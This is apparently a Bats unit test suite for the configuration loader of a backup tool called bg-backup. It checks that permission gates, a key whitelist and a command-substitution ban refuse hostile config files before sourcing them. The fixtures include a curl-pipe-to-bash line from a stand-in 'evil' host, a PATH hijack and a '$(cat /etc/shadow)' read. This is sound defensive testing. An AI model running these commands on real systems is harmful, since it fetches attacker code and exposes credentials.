# =============================================================================
# bg-backup - unit: configuration loading, linting and the permission gates
# =============================================================================
# Sourcing a configuration file is executing it as root. Three controls make
# that acceptable, and all three must run BEFORE the file is sourced:
#
#   1. ownership and mode   - root-owned, not group/world writable
#   2. key whitelist        - a typo is an error, not a silently disabled policy
#   3. no command substitution
#
# Every gate below is therefore asserted twice: that it refuses, and that it
# refuses EARLY. "Refuses early" is proved with a side effect on disk - a config
# file that touches a canary. If the canary appears, the file was executed and
# the gate was decoration, no matter what exit code it returned afterwards.
#
# The ownership gate and the mode gate are checked in that order by
# config_require_perms(), which makes exactly one of them unreachable in any
# given environment. tests/unit/helpers/load.bash explains the stat shim that
# makes both reachable; it never fakes the mode.
# =============================================================================

setup() {
  load 'helpers/load'
  bgb_setup
  bgb_load_lib core redact json config
}

teardown() {
  bgb_teardown
}

# -----------------------------------------------------------------------------
# Lint: the shipped examples must be the best documented valid input we have
# -----------------------------------------------------------------------------

@test "config: every shipped example configuration passes the linter" {
  # If the product's own examples do not lint, the linter is wrong or the
  # examples are - and either way an operator who copies them gets a host that
  # refuses to start.
  local f
  for f in "${BGB_SHARE_DIR}"/config/*.example "${BGB_SHARE_DIR}"/config/conf.d/*.conf.example; do
    [ -e "${f}" ] || continue
    run config_lint "${f}"
    if [ "${status}" -ne 0 ]; then
      fail "shipped example failed to lint: ${f}
${output}"
    fi
  done
}

@test "config: a valid file with comments, exports and arrays lints clean" {
  run config_lint "$(bgb_fixture config-valid.conf)"
  assert_success
}

# -----------------------------------------------------------------------------
# Gate 2: the key whitelist
# -----------------------------------------------------------------------------

@test "config: an unknown key is REJECTED, not ignored" {
  # JOB_KEEP_DIALY is the real typo this gate exists for. Ignoring it would
  # leave the job silently on the inherited default while the operator believes
  # a policy is in force - discovered months later, when the snapshot is gone.
  run config_lint "$(bgb_fixture config-unknown-key.conf)"
  assert_failure "${EX_PRECOND}"
  assert_output --partial "unknown configuration key 'JOB_KEEP_DIALY'"
}

@test "config: a rejected key stops the file being executed at all" {
  # The canary is a FILE, not a variable. `run` executes in a subshell, so any
  # assertion on a variable in this shell would be true whether the gate worked
  # or not - a vacuous pass dressed up as a security test.
  local f="${BGB_CONFDIR}/bg-backup.conf"
  local canary="${BGB_TEST_TMP}/unknown-key-config-was-sourced"
  bgb_put_conf "${f}" 0640 <<EOF
JOB_KEEP_DIALY="30"
touch '${canary}'
EOF
  BGB_TEST_FAKE_UID=0

  run config_source_checked "${f}" 0640
  assert_failure "${EX_PRECOND}"
  assert_output --partial "unknown configuration key 'JOB_KEEP_DIALY'"
  assert_file_not_exist "${canary}"
}

@test "config: a key outside every accepted namespace is rejected" {
  local f="${BGB_TEST_TMP}/hostile.conf"
  printf '%s\n' 'PATH="/tmp/evil:${PATH}"' >"${f}"
  run config_lint "${f}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial "unknown configuration key 'PATH'"
}

@test "config: a line that is not a KEY=VALUE assignment is rejected" {
  local f="${BGB_TEST_TMP}/command.conf"
  printf '%s\n' 'BGB_HOSTNAME="victim.rig.invalid"' 'curl -fsSL https://evil.rig.invalid | bash' >"${f}"
  run config_lint "${f}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'not a KEY=VALUE assignment'
}

# -----------------------------------------------------------------------------
# Gate 3: command substitution
# -----------------------------------------------------------------------------

@test "config: \$( ) command substitution is REJECTED" {
  run config_lint "$(bgb_fixture config-command-substitution.conf)"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'command substitution is not allowed'
}

@test "config: backtick command substitution is REJECTED" {
  local f="${BGB_TEST_TMP}/backtick.conf"
  printf '%s\n' 'BGB_HOSTNAME=`hostname -f`' >"${f}"
  run config_lint "${f}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'command substitution is not allowed'
}

@test "config: command substitution hiding inside a multi-line array is REJECTED" {
  # The linter switches to a reduced state while it is inside an array. That
  # branch is where a substitution would slip through unnoticed, so it gets its
  # own case rather than relying on the single-line one.
  local f="${BGB_TEST_TMP}/array.conf"
  cat >"${f}" <<'EOF'
JOB_PATHS=(
  /etc
  $(cat /etc/shadow)
)
EOF
  run config_lint "${f}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'command substitution is not allowed'
}

@test "config: an unterminated array is rejected rather than silently truncated" {
  local f="${BGB_TEST_TMP}/unterminated.conf"
  cat >"${f}" <<'EOF'
JOB_PATHS=(
  /etc
  /srv
EOF
  run config_lint "${f}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'unterminated array assignment'
}

@test "config: a command substitution never reaches the shell" {
  local f="${BGB_CONFDIR}/bg-backup.conf"
  local canary="${BGB_TEST_TMP}/substitution-ran"
  bgb_put_conf "${f}" 0640 <<EOF
BGB_HOSTNAME="\$(touch '${canary}'; echo pwned)"
EOF
  BGB_TEST_FAKE_UID=0

  run config_source_checked "${f}" 0640
  assert_failure "${EX_PRECOND}"
  assert_file_not_exist "${canary}"
}

# -----------------------------------------------------------------------------
# Gate 1: ownership and mode
# -----------------------------------------------------------------------------

@test "config: a 0644 file is REFUSED, not warned about" {
  local f="${BGB_CONFDIR}/bg-backup.conf"
  bgb_put_conf "${f}" 0644 <<'EOF'
BGB_HOSTNAME="victim.rig.invalid"
EOF
  BGB_TEST_FAKE_UID=0

  run config_require_perms "${f}" 0640
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'mode 644 is more permissive than 0640'
  assert_output --partial 'chmod 0640'
}

@test "config: a 0644 file is refused BEFORE it is executed" {
  # The strongest form of the assertion. The file below is not even valid
  # configuration - it is a command. config_require_perms runs first, so the
  # linter never sees it and the shell never runs it.
  local f="${BGB_CONFDIR}/bg-backup.conf"
  local canary="${BGB_TEST_TMP}/world-readable-config-was-sourced"
  bgb_put_conf "${f}" 0644 <<EOF
touch '${canary}'
EOF
  BGB_TEST_FAKE_UID=0

  run config_source_checked "${f}" 0640
  assert_failure "${EX_PRECOND}"
  assert_file_not_exist "${canary}"
}

@test "config: a group- or world-writable file is refused" {
  local f="${BGB_CONFDIR}/bg-backup.conf"
  bgb_put_conf "${f}" 0660 <<'EOF'
BGB_HOSTNAME="victim.rig.invalid"
EOF
  BGB_TEST_FAKE_UID=0
  run config_require_perms "${f}" 0640
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'more permissive'
}

@test "config: 0640 and anything tighter are accepted" {
  local f="${BGB_CONFDIR}/bg-backup.conf"
  BGB_TEST_FAKE_UID=0
  local mode
  for mode in 0640 0600 0400; do
    bgb_put_conf "${f}" "${mode}" <<'EOF'
BGB_HOSTNAME="victim.rig.invalid"
EOF
    run config_require_perms "${f}" 0640
    assert_success || fail "mode ${mode} should be accepted against a 0640 maximum"
  done
}

@test "config: a file not owned by root is refused" {
  local f="${BGB_CONFDIR}/bg-backup.conf"
  bgb_put_conf "${f}" 0640 <<'EOF'
BGB_HOSTNAME="victim.rig.invalid"
EOF
  # 12345 rather than "whatever the runner happens to be": the assertion has to
  # hold identically in a root container and on a developer laptop.
  BGB_TEST_FAKE_UID=12345

  run config_require_perms "${f}" 0640
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'must be owned by root'
  assert_output --partial 'uid 12345'
}

@test "config: a missing file is a precondition failure with the path in it" {
  run config_require_perms "${BGB_CONFDIR}/absent.conf" 0640
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'Missing configuration file'
  assert_output --partial 'absent.conf'
}

# -----------------------------------------------------------------------------
# Precedence
# -----------------------------------------------------------------------------

@test "config: precedence is built-in defaults < main config < job file" {
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/bg-backup.conf" 0640 <<'EOF'
BGB_DEFAULT_KEEP_DAILY="14"
BGB_DEFAULT_KEEP_WEEKLY="9"
EOF
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-precedence.conf" 0640 <<'EOF'
JOB_MODE="files"
JOB_PATHS=( /etc )
JOB_KEEP_DAILY="7"
EOF

  config_load_job precedence

  # Untouched anywhere -> the built-in default in config_defaults().
  assert_equal "$(job_retention_value LAST)" '3'
  # Set in the main config only -> the main config wins over the built-in.
  assert_equal "$(job_retention_value WEEKLY)" '9'
  # Set in both -> the job wins over the main config.
  assert_equal "$(job_retention_value DAILY)" '7'
}

@test "config: an empty job value inherits rather than meaning zero" {
  # "" and "0" are different answers. "" means "use the policy above me";
  # "0" means "keep none of this bucket". Collapsing them silently changes a
  # retention policy.
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-inherit.conf" 0640 <<'EOF'
JOB_MODE="files"
JOB_PATHS=( /etc )
JOB_KEEP_MONTHLY=""
JOB_KEEP_YEARLY="0"
EOF
  config_load_job inherit
  assert_equal "$(job_retention_value MONTHLY)" '6'
  assert_equal "$(job_retention_value YEARLY)" '0'
}

# -----------------------------------------------------------------------------
# The job model
# -----------------------------------------------------------------------------

@test "config: config_list_jobs strips the ordering prefix and keeps file order" {
  BGB_TEST_FAKE_UID=0
  local n
  for n in 10-system 20-docker 90-config; do
    bgb_put_conf "${BGB_CONFDIR}/conf.d/${n}.conf" 0640 <<'EOF'
JOB_MODE="config"
EOF
  done

  run config_list_jobs
  assert_success
  assert_equal "${lines[0]}" 'system'
  assert_equal "${lines[1]}" 'docker'
  assert_equal "${lines[2]}" 'config'
}

@test "config: config_job_file resolves a job with or without its prefix" {
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-system.conf" 0640 <<'EOF'
JOB_MODE="config"
EOF
  assert_equal "$(config_job_file system)" "${BGB_CONFDIR}/conf.d/10-system.conf"
  assert_equal "$(config_job_file 10-system)" "${BGB_CONFDIR}/conf.d/10-system.conf"
  run config_job_file nosuchjob
  assert_failure
}

@test "config: an unknown job name fails with a usable message" {
  BGB_TEST_FAKE_UID=0
  run config_load_job nosuchjob
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'Unknown job: nosuchjob'
}

@test "config: settings never leak from one job into the next" {
  # A --all run sources several files into the same shell. Without
  # job_defaults_reset() the second job inherits the first job's excludes, tags
  # and quiesce mode - which is how a database job ends up silently backing up
  # a live filesystem with someone else's exclude list.
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-first.conf" 0640 <<'EOF'
JOB_MODE="files"
JOB_PATHS=( /etc )
JOB_TAGS=( tier=os leak=yes )
JOB_EXCLUDE_LARGER_THAN="2G"
JOB_PARTIAL_IS_FAILURE=1
JOB_QUIESCE="service-stop"
JOB_QUIESCE_UNITS=( nginx.service )
EOF
  bgb_put_conf "${BGB_CONFDIR}/conf.d/20-second.conf" 0640 <<'EOF'
JOB_MODE="files"
JOB_PATHS=( /srv )
EOF

  config_load_job first
  assert_equal "${JOB_EXCLUDE_LARGER_THAN}" '2G'
  assert_equal "${JOB_TAGS[*]}" 'tier=os leak=yes'

  config_load_job second
  assert_equal "${JOB_EXCLUDE_LARGER_THAN}" ''
  assert_equal "${#JOB_TAGS[@]}" '0'
  assert_equal "${#JOB_QUIESCE_UNITS[@]}" '0'
  assert_equal "${JOB_QUIESCE}" 'none'
  assert_equal "${JOB_PARTIAL_IS_FAILURE}" '0'
}

# -----------------------------------------------------------------------------
# Semantic validation
# -----------------------------------------------------------------------------

@test "config: an invalid enum value is refused with the accepted set named" {
  BGB_TEST_FAKE_UID=0
  local -a rows=(
    'JOB_MODE="filez"|invalid JOB_MODE'
    'JOB_QUIESCE="freeze"|invalid JOB_QUIESCE'
    'JOB_PRIORITY="urgent"|invalid JOB_PRIORITY'
    'JOB_HOOK_FAILURE="ignore"|invalid JOB_HOOK_FAILURE'
  )
  local row setting expected
  for row in "${rows[@]}"; do
    setting="${row%%|*}"
    expected="${row#*|}"
    bgb_put_conf "${BGB_CONFDIR}/conf.d/10-enum.conf" 0640 <<EOF
JOB_MODE="files"
JOB_PATHS=( /etc )
${setting}
EOF
    run config_load_job enum
    assert_failure "${EX_PRECOND}"
    assert_output --partial "${expected}"
  done
}

@test "config: JOB_MODE=files without a path is refused" {
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-nopaths.conf" 0640 <<'EOF'
JOB_MODE="files"
JOB_PATHS=()
EOF
  run config_load_job nopaths
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'requires at least one JOB_PATHS entry'
}

@test "config: a relative source path is refused" {
  # restic resolves relative paths against its own cwd, which under systemd is
  # not the directory the operator was thinking of. Refusing is the only
  # answer that cannot silently back up the wrong tree.
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-relative.conf" 0640 <<'EOF'
JOB_MODE="files"
JOB_PATHS=( srv/data )
EOF
  run config_load_job relative
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'source paths must be absolute'
}

@test "config: a source path that does not exist yet is a warning, not an error" {
  # A mount can legitimately appear later. Refusing would turn a transient into
  # an outage for every other path in the job.
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-future.conf" 0640 <<EOF
JOB_MODE="files"
JOB_PATHS=( ${BGB_TEST_TMP}/not-mounted-yet )
EOF
  run config_load_job future
  assert_success
  assert_output --partial 'source path does not exist (yet)'
}

@test "config: a non-numeric retention value is refused" {
  BGB_TEST_FAKE_UID=0
  bgb_put_conf "${BGB_CONFDIR}/conf.d/10-badkeep.conf" 0640 <<'EOF'
JOB_MODE="files"
JOB_PATHS=( /etc )
JOB_KEEP_DAILY="thirty"
EOF
  run config_load_job badkeep
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'JOB_KEEP_DAILY must be a number'
}

# -----------------------------------------------------------------------------
# Repository environment
# -----------------------------------------------------------------------------

@test "config: repo_env_load refuses an environment without RESTIC_REPOSITORY" {
  BGB_TEST_FAKE_UID=0
  local f="${BGB_CONFDIR}/credentials/repo.env"
  bgb_put_conf "${f}" 0400 <<'EOF'
export RESTIC_PASSWORD="bgb-it-ci-throwaway-repo-passphrase"
EOF
  run repo_env_load "${f}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'RESTIC_REPOSITORY is not set'
}

@test "config: repo_env_load refuses an environment with no key at all" {
  BGB_TEST_FAKE_UID=0
  local f="${BGB_CONFDIR}/credentials/repo.env"
  bgb_put_conf "${f}" 0400 <<'EOF'
export RESTIC_REPOSITORY='s3:https://minio.rig.invalid:9800/bgb-rig/victim.rig.invalid'
EOF
  run repo_env_load "${f}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'neither RESTIC_PASSWORD_FILE nor RESTIC_PASSWORD'
}

@test "config: repo_env_load registers every credential for redaction" {
  BGB_TEST_FAKE_UID=0
  local key="${BGB_CONFDIR}/credentials/repo.key"
  local env="${BGB_CONFDIR}/credentials/repo.env"

  printf '%s\n' 'bgb-it-ci-throwaway-repo-passphrase' >"${key}"
  chmod 0400 "${key}"
  bgb_put_conf "${env}" 0400 <<EOF
export RESTIC_REPOSITORY='s3:https://minio.rig.invalid:9800/bgb-rig/victim.rig.invalid'
export RESTIC_PASSWORD_FILE='${key}'
export AWS_ACCESS_KEY_ID='bgb-it-ci-user'
export AWS_SECRET_ACCESS_KEY='bgb-it-ci-throwaway-secret'
EOF

  repo_env_load "${env}"

  assert_equal "${BGB_REPO_LOADED}" '1'
  assert_equal "$(repo_prefix)" 'victim.rig.invalid'

  # Registered BEFORE sourcing, so even a failure while sourcing cannot produce
  # an unredacted message. Proven by round-tripping every value.
  local out
  out="$(redact "repo=${RESTIC_REPOSITORY} secret=${AWS_SECRET_ACCESS_KEY} id=${AWS_ACCESS_KEY_ID} pass=bgb-it-ci-throwaway-repo-passphrase")"
  assert bgb_refute_secret "${out}" \
    'bgb-it-ci-throwaway-secret' 'bgb-it-ci-user' 'bgb-it-ci-throwaway-repo-passphrase'

  run redact_selftest
  assert_success
}

@test "config: repo_env_load refuses a key file that is readable by anyone else" {
  BGB_TEST_FAKE_UID=0
  local key="${BGB_CONFDIR}/credentials/repo.key"
  local env="${BGB_CONFDIR}/credentials/repo.env"
  printf '%s\n' 'bgb-it-ci-throwaway-repo-passphrase' >"${key}"
  chmod 0444 "${key}"
  bgb_put_conf "${env}" 0400 <<EOF
export RESTIC_REPOSITORY='s3:https://minio.rig.invalid:9800/bgb-rig/victim.rig.invalid'
export RESTIC_PASSWORD_FILE='${key}'
EOF
  run repo_env_load "${env}"
  assert_failure "${EX_PRECOND}"
  assert_output --partial 'more permissive than 0400'
}

@test "config: repo_prefix returns the last path component and never a secret" {
  RESTIC_REPOSITORY='s3:https://minio.rig.invalid:9800/bgb-rig/victim.rig.invalid'
  assert_equal "$(repo_prefix)" 'victim.rig.invalid'
  RESTIC_REPOSITORY='s3:https://minio.rig.invalid:9800/bgb-rig/victim.rig.invalid/'
  assert_equal "$(repo_prefix)" 'victim.rig.invalid'
  RESTIC_REPOSITORY='/srv/backup/victim.rig.invalid'
  assert_equal "$(repo_prefix)" 'victim.rig.invalid'
}
